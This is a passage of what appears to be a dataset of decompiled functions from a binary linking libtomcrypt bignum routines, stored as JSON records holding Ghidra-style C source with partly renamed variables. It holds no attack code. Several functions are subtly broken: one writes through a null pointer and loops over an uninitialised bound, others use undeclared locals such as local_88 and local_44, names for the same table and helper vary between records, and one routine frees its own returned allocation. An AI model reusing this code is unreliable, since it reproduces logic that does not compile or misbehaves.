Variable: local_188 : undefined8"}
{"Function Name": "FUN_0040e600", "Address": "0040e600", "Source Code": "ulong FUN_0040e600(undefined8 input_param, ulong flags, undefined4 *data_array, int condition)\n{\n    undefined8 *array_pointer; \n    uint result; \n    ulong function_result; \n    long loop_counter; \n    int second_element; \n    undefined temp_buffer[40]; \n    \n    function_result = FUN_00406f80(temp_buffer, input_param);\n    \n    if ((int)function_result != 0) {\n        return function_result;\n    }\n    \n    \n    second_element = data_array[1];\n    loop_counter = 0; \n    data_array[2] = 0; \n    *data_array = 0; \n    array_pointer = *(undefined8 **)(data_array + 4); \n    \n    if (second_element > 0) {\n        do {\n            array_pointer[loop_counter] = 0; \n            loop_counter++; \n        } while (loop_counter < second_element); \n    }\n    \n    *array_pointer = 1; \n    *data_array = 1; \n    \n    if (condition == 0) {\n        second_element = 0x3c; \n        do {\n            \n            result = FUN_0040df80(data_array, data_array);\n            \n            if (result != 0 || ((flags & 0x800000000000000) != 0 && (result = FUN_0040cb50(data_array, temp_buffer, data_array), result != 0))) {\n                goto LAB_0040e6b8; \n            }\n            flags *= 2; \n            second_element--; \n        } while (second_element != 0); \n    } else if (flags != 0) { \n        do {\n            \n            if ((((flags & 1) != 0 && (result = FUN_0040cb50(data_array, temp_buffer, data_array), result != 0)) || (1 < flags && (result = FUN_0040df80(temp_buffer), result != 0)))) {\nLAB_0040e6b8:\n                FUN_004064f0(temp_buffer); \n                return (ulong)result; \n            }\n            flags >>= 1; \n        } while (flags != 0); \n    }\n    \n    FUN_004064f0(temp_buffer); \n    return 0; \n}"}
{"Function Name": "FUN_0040e750", "Address": "0040e750", "Source Code": "ulong FUN_0040e750(long input_address, ulong input_value, undefined8 *output_array, undefined4 additional_param)\n{\n    undefined4 temp_value; \n    ulong return_value; \n    long loop_counter; \n    undefined8 data_storage; \n    undefined4 temp_storage; \n    int loop_limit; \n    undefined8 *data_pointer; \n    undefined buffer[40]; \n    \n    if (((input_value & 1) == 0) && (*(int *)(input_address + 8) == 1)) {\n        return_value = 0xfffffffd; \n    } else {\n        return_value = FUN_00406af0(&data_storage); \n        if ((int)return_value == 0) { \n            \n            if (FUN_00406af0(&temp_storage) == 0 && FUN_00406af0(buffer) == 0) {\n                temp_value = *(undefined4 *)(input_address + 8); \n                *(undefined4 *)(input_address + 8) = 0; \n                data_pointer = (undefined8 *)0; \n                loop_counter = 0; \n                \n                if (0 < loop_limit) {\n                    do {\n                        data_pointer[loop_counter] = 0; \n                        loop_counter++; \n                    } while (loop_counter < loop_limit); \n                }\n                *data_pointer = 2; \n                temp_storage = 1; \n                do {\n                    \n                    if (FUN_00406750(&temp_storage, &data_storage) != 0) goto LAB_0040e910; \n                    if (FUN_0040e600(&data_storage, input_value - 1, buffer, additional_param) != 0) goto LAB_0040e910; \n                    if (FUN_0040cb50(buffer, &data_storage, &temp_storage) != 0) goto LAB_0040e910; \n                    if (FUN_0040b100(&temp_storage, input_address) != 0) goto LAB_0040e910; \n                    if (FUN_004078b0(buffer, input_value) != 0) goto LAB_0040e910; \n                    if (FUN_0040b190(&temp_storage, buffer, buffer, 0) != 0) goto LAB_0040e910; \n                    if (FUN_0040b100(&data_storage, buffer, &temp_storage) != 0) goto LAB_0040e910; \n                } while (FUN_00406680(&data_storage, &temp_storage) != 0); \n                do {\n                    \n                    if (FUN_0040e600(&data_storage, input_value, &temp_storage, additional_param) != 0) break; \n                    if (FUN_00406680(&temp_storage, input_address) != 1) { \n                        *(undefined4 *)(input_address + 8) = temp_value; \n                        *(undefined4 *)output_array = (undefined4)data_storage; \n                        *(undefined4 *)((long)output_array + 4) = data_storage._4_4_; \n                        *(undefined8 *)(output_array + 1) = output_array[1]; \n                        *(undefined4 *)(output_array + 1) = temp_value; \n                        output_array[2] = local_88; \n                        data_storage = *(undefined8 *)output_array; \n                        break; \n                    }\n                } while (FUN_00408b90(&data_storage, 1) == 0); \n            }\n        }\n    LAB_0040e910:\n        FUN_004064f0(buffer); \n    }\n    FUN_004064f0(&temp_storage); \n    FUN_004064f0(&data_storage); \n    return return_value; \n}"}
{"Function Name": "FUN_0040fe70", "Address": "0040fe70", "Source Code": "ulong FUN_0040fe70(int *param_1, int param_2, undefined4 *param_3)\n{\n    uint tempUnsignedInt; \n    ulong tempUnsignedLong; \n    long tempLong; \n    undefined8 *dataPointer; \n    ulong *dataPointerLong; \n    int tempInt; \n    uint tempUnsignedIntLocal; \n    *param_3 = 0; \n    if (param_2 - 1U < 0x100) { \n        if (param_1[2] != 1 && *param_1 < 2) { \n            dataPointer = &DAT_0043e5c0; \n            do {\n                tempUnsignedLong = FUN_00405a00(param_1, *dataPointer); \n                if ((int)tempUnsignedLong == 0) { \n                    *param_3 = 1; \n                    return tempUnsignedLong; \n                }\n                dataPointer++; \n            } while (dataPointer != &DAT_0043edc0); \n        }\n        tempUnsignedLong = FUN_00408430(param_1, &tempInt); \n        if ((int)tempUnsignedLong == 0 && tempInt != 1 && (tempUnsignedLong = FUN_00406af0(&tempUnsignedIntLocal), (int)tempUnsignedLong == 0)) { \n            dataPointerLong = &DAT_0043e5c0; \n            do {\n                tempLong = 0; \n                if (local_44 > 0) { \n                    do {\n                        local_38[tempLong] = 0; \n                        tempLong++; \n                    } while ((int)tempLong < local_44); \n                }\n                *local_38 = tempUnsignedLong & 0xfffffffffffffff; \n                tempUnsignedIntLocal = (uint)((tempUnsignedLong & 0xfffffffffffffff) != 0); \n                tempUnsignedInt = FUN_0040fc90(param_1, &tempUnsignedIntLocal, &tempInt); \n                if (tempUnsignedInt != 0 || tempInt == 0) goto LAB_0040ffa5; \n                dataPointerLong++; \n            } while (dataPointerLong != &DAT_0043e5c8 + (param_2 - 1U)); \n            *param_3 = 1; \n        }\n    } else {\n        tempUnsignedLong = 0xfffffffd; \n    }\nLAB_0040ffa5:\n    FUN_004064f0(&tempUnsignedIntLocal); \n    return tempUnsignedLong; \n}"}
{"Function Name": "FUN_004105c0", "Address": "004105c0", "Source Code": "ulong FUN_004105c0(int *param_1,int *param_2,undefined4 *param_3)\n{\nuint uVar1;\nint iVar2;\nulong uVar3;\nlong lVar4;\nlong lVar5;\nint local_164;\nulong local_160;\nint local_158 [2];\nint local_150;\nundefined local_138 [32];\nint local_118 [4];\nbyte *local_108;\nundefined4 local_f8;\nint local_f4;\nundefined4 local_f0;\nlong local_e8;\nundefined local_d8 [32];\nuint local_b8;\nint local_b4;\nundefined4 local_b0;\nulong *local_a8;\nundefined local_98 [32];\nundefined local_78 [32];\nundefined local_58 [40];\nif (((param_1[2] != 1) && (*param_1 < 2)) && (uVar3 = FUN_00405a00(param_1,0), (int)uVar3 == 0)) {\niVar2 = param_3[1];\nlVar5 = 0;\nparam_3[2] = 0;\n*param_3 = 0;\nlVar4 = *(long *)(param_3 + 4);\nif (iVar2 < 1) {\nreturn uVar3;\n}\ndo {\n*(undefined8 *)(lVar4 + lVar5 * 8) = 0;\nlVar5 = lVar5 + 1;\n} while ((int)lVar5 < iVar2);\nreturn uVar3;\n}\nif (((param_2[2] == 1) || (1 < *param_2)) || (iVar2 = FUN_00405a00(param_2,2), iVar2 != 0)) {\nuVar3 = FUN_0040b9f0(param_1,param_2,&local_164);\nif ((int)uVar3 != 0) {\nreturn uVar3;\n}\nif (local_164 != -1) {\nuVar3 = FUN_00406b50(local_158,local_138,local_118,&local_f8,local_d8,&local_b8,local_98,\nlocal_78,local_58,0);\nif ((int)uVar3 != 0) {\nreturn uVar3;\n}\nuVar1 = FUN_00408170(param_2,4,0,&local_160);\nif (uVar1 == 0) {\nif (local_160 == 3) {\nuVar1 = FUN_00408dd0(param_2,1,local_158);\nif (((uVar1 == 0) && (uVar1 = FUN_00406860(local_158), uVar1 == 0)) &&\n(uVar1 = FUN_00406860(local_158), uVar1 == 0)) {\nuVar1 = FUN_0040fa40(param_1,local_158,param_2,param_3);\n}\n}\nelse {\nuVar1 = FUN_00406750(param_2,local_118);\nif ((uVar1 == 0) && (uVar1 = FUN_00408b90(local_118,1), uVar1 == 0)) {\nlocal_f0 = 0;\nlocal_f8 = 0;\nif (0 < local_f4) {\nlVar4 = 0;\ndo {\n*(undefined8 *)(local_e8 + lVar4 * 8) = 0;\nlVar4 = lVar4 + 1;\n} while ((int)lVar4 < local_f4);\n}\nwhile ((0 < local_118[0] && ((*local_108 & 1) == 0))) {\nuVar1 = FUN_00406860(local_118);\nif ((uVar1 != 0) || (uVar1 = FUN_00408dd0(&local_f8,1), uVar1 != 0))\ngoto LAB_004107f0;\n}\nuVar1 = FUN_00408890(local_d8,2);\nif (uVar1 == 0) goto LAB_004108df;\n}\n}\n}\nLAB_004107f0:\nFUN_00406540(local_158,local_138,local_118,&local_f8,local_d8,&local_b8,local_98,local_78,\nlocal_58,0);\nreturn (ulong)uVar1;\n}\n}\nreturn 0xfffffffd;\nLAB_004108df:\nuVar1 = FUN_0040b9f0(local_d8,param_2,&local_164);\nif (uVar1 != 0) goto LAB_004107f0;\nif (local_164 == -1) {\nuVar1 = FUN_0040fa40(local_d8,local_118,param_2,local_138);\nif (((((uVar1 == 0) && (uVar1 = FUN_00408dd0(local_118,1,local_158), uVar1 == 0)) &&\n(uVar1 = FUN_00406860(local_158), uVar1 == 0)) &&\n((uVar1 = FUN_0040fa40(param_1,local_158,param_2,local_78), uVar1 == 0 &&\n(uVar1 = FUN_0040fa40(param_1,local_118,param_2,local_98), uVar1 == 0)))) &&\n((uVar1 = FUN_00406750(&local_f8,&local_b8), uVar1 == 0 &&\n(uVar1 = FUN_00408890(local_58,2), uVar1 == 0)))) goto LAB_00410a0a;\ngoto LAB_004107f0;\n}\nuVar1 = FUN_00408dd0(local_d8,1);\nif (uVar1 != 0) goto LAB_004107f0;\ngoto LAB_004108df;\nLAB_00410a0a:\nuVar1 = FUN_00406750(local_98,local_158);\nif (uVar1 != 0) goto LAB_004107f0;\nlocal_160 = 0;\nwhile (((local_150 == 1 || (1 < local_158[0])) || (iVar2 = FUN_00405a00(local_158,1), iVar2 != 0))\n) {\nuVar1 = FUN_0040fa40(local_158,local_58,param_2);\nif (uVar1 != 0) goto LAB_004107f0;\nlocal_160 = local_160 + 1;\n}\nif (local_160 == 0) {\nuVar1 = FUN_00406750(local_78,param_3);\ngoto LAB_004107f0;\n}\nuVar1 = FUN_00408b90(&local_b8,local_160,local_158);\nif (((((uVar1 != 0) || (uVar1 = FUN_00408b90(local_158,1), uVar1 != 0)) ||\n(uVar1 = FUN_0040fa40(local_58,local_158,param_2), uVar1 != 0)) ||\n((uVar1 = FUN_0040fa40(local_138,local_158,param_2), uVar1 != 0 ||\n(uVar1 = FUN_0040f370(local_158,param_2,local_138), uVar1 != 0)))) ||\n((uVar1 = FUN_0040d9c0(local_78,local_158,param_2,local_78), uVar1 != 0 ||\n(uVar1 = FUN_0040d9c0(local_98,local_138,param_2,local_98), uVar1 != 0)))) goto LAB_004107f0;\nlocal_b0 = 0;\nfor (lVar4 = 0; (int)lVar4 < local_b4; lVar4 = lVar4 + 1) {\nlocal_a8[lVar4] = 0;\n}\n*local_a8 = local_160 & 0xfffffffffffffff;\nlocal_b8 = (uint)((local_160 & 0xfffffffffffffff) != 0);\ngoto LAB_00410a0a;\n}\nLocal Variable: local_58 : undefined1\nLocal Variable: local_78 : undefined1\nLocal Variable: local_98 : undefined1\nLocal Variable: local_a8 : undefined8\nLocal Variable: local_b0 : undefined4\nLocal Variable: local_b4 : undefined4\nLocal Variable: local_b8 : undefined4\nLocal Variable: local_d8 : undefined1\nLocal Variable: local_e8 : undefined8\nLocal Variable: local_f0 : undefined4\nLocal Variable: local_f4 : undefined4\nLocal Variable: local_f8 : undefined4\nLocal Variable: local_108 : undefined8\nLocal Variable: local_118 : undefined4\nLocal Variable: local_138 : undefined1\nLocal Variable: local_150 : undefined4\nLocal Variable: local_158 : undefined4\nLocal Variable: local_160 : undefined8\nLocal Variable: local_164 : undefined4\nLocal Variable: local_16c : undefined4\nLocal Variable: local_180 : undefined8\nLocal Variable: local_188 : undefined8\nLocal Variable: local_190 : undefined8\nLocal Variable: local_198 : undefined8"}
{"Function Name": "FUN_00410bf0", "Address": "00410bf0", "Source Code": "undefined4 FUN_00410bf0(long input_value, uint *output_flag)\n{\n    undefined4 result_value;\n    \n    if (input_value == 0) {\n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x6879);\n    }\n    \n    \n    if (output_flag == (uint *)0x0) {\n        FUN_00410bc0(\"b != NULL\", \"libtomcrypt.c\", 0x687a);\n    }\n    \n    \n    int function_result = FUN_0040fe70(input_value, 8, output_flag);\n    \n    \n    int status_index = (function_result == 0) ? 0 : (function_result == -2) ? 2 : 1;\n    \n    result_value = (&DAT_0043dd34)[(long)status_index * 2];\n    \n    \n    *output_flag = (uint)(*output_flag == 1);\n    \n    \n    return result_value;\n}"}
{"Function Name": "FUN_00410dd0", "Address": "00410dd0", "Source Code": "undefined4 FUN_00410dd0(long first_param, long second_param, undefined8 *third_param)\n{\n    \n    if (first_param == 0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x6863);\n    }\n    \n    \n    if (second_param == 0) {\n        \n        FUN_00410bc0(\"b != NULL\", \"libtomcrypt.c\", 0x6864);\n    }\n    \n    \n    if (third_param == (undefined8 *)0x0) {\n        \n        FUN_00410bc0(\"c != NULL\", \"libtomcrypt.c\", 0x6865);\n    }\n    \n    \n    int result = FUN_0040ac70(first_param, second_param, *third_param);\n    \n    \n    if (result == 0) {\n        \n        return (&DAT_0043dd34)[0];\n    } else if (result == -2) {\n        \n        return (&DAT_0043dd34)[2];\n    } else if (result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00410ea0", "Address": "00410ea0", "Source Code": "undefined4 FUN_00410ea0(long first_param,long second_param)\n{\n    \n    if (first_param == 0) {\n        \n        FUN_00410bc0(\"a != NULL\",\"libtomcrypt.c\",0x685c);\n    }\n    \n    \n    if (second_param == 0) {\n        \n        FUN_00410bc0(\"b != NULL\",\"libtomcrypt.c\",0x685d);\n    }\n    \n    \n    int result = FUN_0040ab60(first_param,second_param);\n    \n    \n    if (result == 0) {\n        \n        return (&data_array)[0];\n    }\n    \n    \n    if (result == -2) {\n        \n        return (&data_array)[2];\n    }\n    \n    \n    if (result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00410f40", "Address": "00410f40", "Source Code": "int FUN_00410f40(long input_value, void **output_pointer)\n{\n    void *allocated_memory; \n    \n    if (input_value == 0) {\n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x684e);\n    }\n    \n    \n    if (output_pointer == (void **)0x0) {\n        FUN_00410bc0(\"b != NULL\", \"libtomcrypt.c\", 0x684f);\n    }\n    \n    \n    allocated_memory = calloc(1, 8);\n    *output_pointer = allocated_memory; \n    \n    \n    if (allocated_memory == (void *)0x0) {\n        return 0xd; \n    }\n    \n    \n    int function_result = FUN_00407370(input_value, allocated_memory);\n    \n    \n    long result_index = (function_result == 0) ? 0 : (function_result == -2) ? 1 : (function_result == -3) ? 2 : 1;\n    \n    int retrieved_value = (&DAT_0043dd34)[result_index * 2];\n    \n    \n    if (retrieved_value == 0) {\n        free(*output_pointer); \n        return 0; \n    }\n    \n    \n    free(*output_pointer);\n    return retrieved_value; \n}"}
{"Function Name": "FUN_00411010", "Address": "00411010", "Source Code": "undefined4 FUN_00411010(long input_a, long input_b, long input_c)\n{\n    int result;\n    \n    if (input_a == 0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x6844);\n    }\n    \n    \n    if (input_b == 0) {\n        \n        FUN_00410bc0(\"b != NULL\", \"libtomcrypt.c\", 0x6845);\n    }\n    \n    \n    if (input_c == 0) {\n        \n        FUN_00410bc0(\"c != NULL\", \"libtomcrypt.c\", 0x6846);\n    }\n    \n    \n    result = FUN_0040c6c0(input_a, input_b, input_c);\n    \n    \n    if (result == 0) {\n        \n        return (&DAT_0043dd34)[0];\n    }\n    if (result == -2) {\n        \n        return (&DAT_0043dd34)[2];\n    }\n    if (result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_004110e0", "Address": "004110e0", "Source Code": "undefined4 FUN_004110e0(long input_a,long input_b,long input_c)\n{\n    \n    if (input_a == 0) {\n        \n        FUN_00410bc0(\"a != NULL\",\"libtomcrypt.c\",0x683c);\n    }\n    \n    if (input_b == 0) {\n        \n        FUN_00410bc0(\"b != NULL\",\"libtomcrypt.c\",0x683d);\n    }\n    \n    if (input_c == 0) {\n        \n        FUN_00410bc0(\"c != NULL\",\"libtomcrypt.c\",0x683e);\n    }\n    \n    \n    int result = FUN_0040f370(input_a,input_b,input_c);\n    \n    \n    if (result == 0) {\n        \n        return (&data_array)[0];\n    } else if (result == -2) {\n        \n        return (&data_array)[2];\n    } else if (result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_004112e0", "Address": "004112e0", "Source Code": "undefined4 FUN_004112e0(long input_a,long input_b,long input_c)\n{\n    \n    if (input_a == 0) {\n        \n        FUN_00410bc0(\"a != NULL\",\"libtomcrypt.c\",0x682d);\n    }\n    \n    \n    if (input_b == 0) {\n        \n        FUN_00410bc0(\"b != NULL\",\"libtomcrypt.c\",0x682e);\n    }\n    \n    \n    if (input_c == 0) {\n        \n        FUN_00410bc0(\"c != NULL\",\"libtomcrypt.c\",0x682f);\n    }\n    \n    \n    int result = FUN_0040d8e0(input_a,input_b,input_c);\n    \n    \n    if (result == 0) {\n        \n        return (&DAT_0043dd34)[0];\n    } else if (result == -2) {\n        \n        return (&DAT_0043dd34)[2];\n    } else if (result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_004113b0", "Address": "004113b0", "Source Code": "undefined4 FUN_004113b0(long input_a,long input_b,long input_c)\n{\n    int result_code;\n    \n    if (input_a == 0) {\n        \n        log_error(\"a != NULL\",\"libtomcrypt.c\",0x6825);\n    }\n    \n    \n    if (input_b == 0) {\n        \n        log_error(\"b != NULL\",\"libtomcrypt.c\",0x6826);\n    }\n    \n    \n    if (input_c == 0) {\n        \n        log_error(\"c != NULL\",\"libtomcrypt.c\",0x6827);\n    }\n    \n    \n    result_code = process_inputs(input_a,input_b,input_c);\n    \n    \n    if (result_code == 0) {\n        \n        return (&data_array)[0];\n    }\n    if (result_code == -2) {\n        \n        return (&data_array)[2];\n    }\n    if (result_code == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00411540", "Address": "00411540", "Source Code": "undefined4 FUN_00411540(long first_param,long second_param)\n{\n    \n    if (first_param == 0) {\n        \n        FUN_00410bc0(\"a != NULL\",\"libtomcrypt.c\",0x680f);\n    }\n    \n    \n    if (second_param == 0) {\n        \n        FUN_00410bc0(\"b != NULL\",\"libtomcrypt.c\",0x6810);\n    }\n    \n    \n    int result = FUN_00406860(first_param,second_param);\n    \n    \n    if (result == 0) {\n        \n        return (&data_array)[0];\n    } else if (result == -2) {\n        \n        return (&data_array)[2];\n    } else if (result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_004116a0", "Address": "004116a0", "Source Code": "undefined4 FUN_004116a0(long first_param, long second_param)\n{\n    \n    if (first_param == 0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x6802);\n    }\n    \n    \n    if (second_param == 0) {\n        \n        FUN_00410bc0(\"b != NULL\", \"libtomcrypt.c\", 0x6803);\n    }\n    \n    \n    int result = FUN_0040df80(first_param, second_param);\n    \n    \n    if (result == 0) {\n        \n        return (&data_array)[0];\n    } else if (result == -2) {\n        \n        return (&data_array)[2];\n    } else if (result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00411740", "Address": "00411740", "Source Code": "undefined4 FUN_00411740(long inputPointer, undefined8 inputData, long outputPointer)\n{\n    \n    if (inputPointer == 0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x67fb);\n    }\n    \n    \n    if (outputPointer == 0) {\n        \n        FUN_00410bc0(\"c != NULL\", \"libtomcrypt.c\", 0x67fc);\n    }\n    \n    \n    int functionResult = FUN_004078b0(inputPointer, inputData, outputPointer);\n    \n    \n    if (functionResult == 0) {\n        \n        return (&DAT_0043dd34)[0];\n    } else if (functionResult == -2) {\n        \n        return (&DAT_0043dd34)[2];\n    } else if (functionResult == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_004117e0", "Address": "004117e0", "Source Code": "undefined4 FUN_004117e0(long input_a,long input_b,long input_c)\n{\n    \n    if (input_a == 0) {\n        \n        FUN_00410bc0(\"a != NULL\",\"libtomcrypt.c\",0x67f4);\n    }\n    \n    if (input_b == 0) {\n        \n        FUN_00410bc0(\"b != NULL\",\"libtomcrypt.c\",0x67f5);\n    }\n    \n    if (input_c == 0) {\n        \n        FUN_00410bc0(\"c != NULL\",\"libtomcrypt.c\",0x67f6);\n    }\n    \n    \n    int result = FUN_0040cb50(input_a,input_b,input_c);\n    \n    \n    if (result == 0) {\n        \n        return (&data_array)[0];\n    } else if (result == -2) {\n        \n        return (&data_array)[2];\n    } else if (result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_004118b0", "Address": "004118b0", "Source Code": "undefined4 FUN_004118b0(long inputPointer, undefined8 inputData, long outputPointer)\n{\n    \n    if (inputPointer == 0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x67ed);\n    }\n    \n    \n    if (outputPointer == 0) {\n        \n        FUN_00410bc0(\"c != NULL\", \"libtomcrypt.c\", 0x67ee);\n    }\n    \n    \n    int functionResult = FUN_00408b90(inputPointer, inputData, outputPointer);\n    \n    \n    if (functionResult == 0) {\n        \n        return (&DAT_0043dd34)[0];\n    } else if (functionResult == -2) {\n        \n        return (&DAT_0043dd34)[2];\n    } else if (functionResult == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00411950", "Address": "00411950", "Source Code": "undefined4 FUN_00411950(long input_a,long input_b,long input_c)\n{\n    int result;\n    \n    if (input_a == 0) {\n        \n        FUN_00410bc0(\"a != NULL\",\"libtomcrypt.c\",0x67e6);\n    }\n    \n    \n    if (input_b == 0) {\n        \n        FUN_00410bc0(\"b != NULL\",\"libtomcrypt.c\",0x67e7);\n    }\n    \n    \n    if (input_c == 0) {\n        \n        FUN_00410bc0(\"c != NULL\",\"libtomcrypt.c\",0x67e8);\n    }\n    \n    \n    result = FUN_0040b100(input_a,input_b,input_c);\n    \n    \n    if (result == 0) {\n        \n        return (&data_array)[0];\n    }\n    \n    \n    if (result == -2) {\n        \n        return (&data_array)[2];\n    }\n    \n    \n    if (result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00411a20", "Address": "00411a20", "Source Code": "undefined4 FUN_00411a20(long input_a, undefined8 input_b, long input_c)\n{\n    \n    if (input_a == 0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x67df);\n    }\n    \n    \n    if (input_c == 0) {\n        \n        FUN_00410bc0(\"c != NULL\", \"libtomcrypt.c\", 0x67e0);\n    }\n    \n    \n    int result_code = FUN_00408dd0(input_a, input_b, input_c);\n    \n    \n    if (result_code == 0) {\n        \n        return (&DAT_0043dd34)[0];\n    } else if (result_code == -2) {\n        \n        return (&DAT_0043dd34)[2];\n    } else if (result_code == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00411ac0", "Address": "00411ac0", "Source Code": "undefined4 FUN_00411ac0(long input_a,long input_b,long input_c)\n{\n    \n    if (input_a == 0) {\n        \n        FUN_00410bc0(\"a != NULL\",\"libtomcrypt.c\",0x67d8);\n    }\n    \n    \n    if (input_b == 0) {\n        \n        FUN_00410bc0(\"b != NULL\",\"libtomcrypt.c\",0x67d9);\n    }\n    \n    \n    if (input_c == 0) {\n        \n        FUN_00410bc0(\"c != NULL\",\"libtomcrypt.c\",0x67da);\n    }\n    \n    \n    int result = FUN_0040a6e0(input_a,input_b,input_c);\n    \n    \n    if (result == 0) {\n        \n        return (&data_array)[0];\n    } else if (result == -2) {\n        \n        return (&data_array)[2];\n    } else if (result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00411b90", "Address": "00411b90", "Source Code": "undefined4 FUN_00411b90(long first_param, long second_param, undefined4 third_param)\n{\n    \n    if (first_param == 0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x67d1);\n    }\n    \n    \n    if (second_param == 0) {\n        \n        FUN_00410bc0(\"b != NULL\", \"libtomcrypt.c\", 0x67d2);\n    }\n    \n    \n    int function_result = FUN_00407be0(first_param, second_param, third_param);\n    \n    \n    if (function_result == 0) {\n        \n        return (&DAT_0043dd34)[0];\n    } else if (function_result == -2) {\n        \n        return (&DAT_0043dd34)[2];\n    } else if (function_result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00411c30", "Address": "00411c30", "Source Code": "undefined4 FUN_00411c30(long first_param, long second_param)\n{\n    \n    if (first_param == 0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x67ca);\n    }\n    \n    \n    if (second_param == 0) {\n        \n        FUN_00410bc0(\"b != NULL\", \"libtomcrypt.c\", 0x67cb);\n    }\n    \n    \n    int result = FUN_00409390(first_param, second_param);\n    \n    \n    if (result == 0) {\n        \n        return (&data_array)[0];\n    } else if (result == -2) {\n        \n        return (&data_array)[2];\n    } else if (result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00411cd0", "Address": "00411cd0", "Source Code": "long FUN_00411cd0(long input_param)\n{\n    \n    if (input_param != 0) {\n        \n        return (long)process_function(input_param);\n    }\n    \n    log_error(\"a != NULL\",\"libtomcrypt.c\",0x67c4);\n    \n    return (long)process_function(0);\n}"}
{"Function Name": "FUN_00411d10", "Address": "00411d10", "Source Code": "undefined4 FUN_00411d10(long input_a, long input_b, undefined4 input_c)\n{\n    \n    if (input_a == 0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x67bd);\n    }\n    \n    \n    if (input_b == 0) {\n        \n        FUN_00410bc0(\"b != NULL\", \"libtomcrypt.c\", 0x67be);\n    }\n    \n    \n    int result_code = FUN_00409470(input_a, input_b, input_c);\n    \n    \n    if (result_code == 0) {\n        \n        return (&DAT_0043dd34)[0];\n    } else if (result_code == -2) {\n        \n        return (&DAT_0043dd34)[2];\n    } else if (result_code == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00411db0", "Address": "00411db0", "Source Code": "undefined4 FUN_00411db0(long input_a, long input_b, undefined4 input_c)\n{\n    \n    if (input_a == 0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x67b6);\n    }\n    \n    \n    if (input_b == 0) {\n        \n        FUN_00410bc0(\"b != NULL\", \"libtomcrypt.c\", 0x67b7);\n    }\n    \n    \n    int result_code = FUN_00409240(input_a, input_b, input_c);\n    \n    \n    if (result_code == 0) {\n        \n        return (&DAT_0043dd34)[0];\n    }\n    if (result_code == -2) {\n        \n        return (&DAT_0043dd34)[2];\n    }\n    if (result_code == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00411e50", "Address": "00411e50", "Source Code": "undefined4 FUN_00411e50(long inputPointer, undefined4 inputValue)\n{\n    \n    if (inputPointer == 0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x67ae);\n    }\n    \n    \n    int result = FUN_004063d0(inputPointer, inputValue);\n    \n    \n    if (result == 0) {\n        \n        return (&dataArray)[0];\n    }\n    \n    \n    if (result == -2) {\n        \n        return (&dataArray)[2];\n    }\n    \n    \n    if (result == -3) {\n        \n        return (&dataArray)[4];\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00411ed0", "Address": "00411ed0", "Source Code": "void FUN_00411ed0(long input_param)\n{\n    \n    if (input_param != 0) {\n        \n        process_input(input_param);\n    } else {\n        \n        log_error(\"a != NULL\",\"libtomcrypt.c\",0x67a9);\n        \n        process_input(0);\n    }\n}"}
{"Function Name": "FUN_00411f10", "Address": "00411f10", "Source Code": "ulong FUN_00411f10(int *input_pointer)\n{\n    \n    if (input_pointer == (int *)0x0) {\n        \n        FUN_00410bc0(\"a != NULL\",\"libtomcrypt.c\",0x67a4);\n    }\n    \n    \n    int dereferenced_value = *input_pointer;\n    \n    ulong calculated_value = (ulong)dereferenced_value;\n    \n    \n    if (dereferenced_value != 0) {\n        \n        uint bit_count = (dereferenced_value - 1) * 0x3c;\n        \n        calculated_value = *(ulong *)(*(long *)(input_pointer + 4) - 8 + calculated_value * 8);\n        \n        \n        if (calculated_value == 0) {\n            \n            return (ulong)bit_count;\n        }\n        \n        \n        do {\n            bit_count++; \n            calculated_value >>= 1; \n        } while (calculated_value != 0); \n        \n        \n        calculated_value = (ulong)bit_count;\n    }\n    \n    \n    return calculated_value;\n}"}
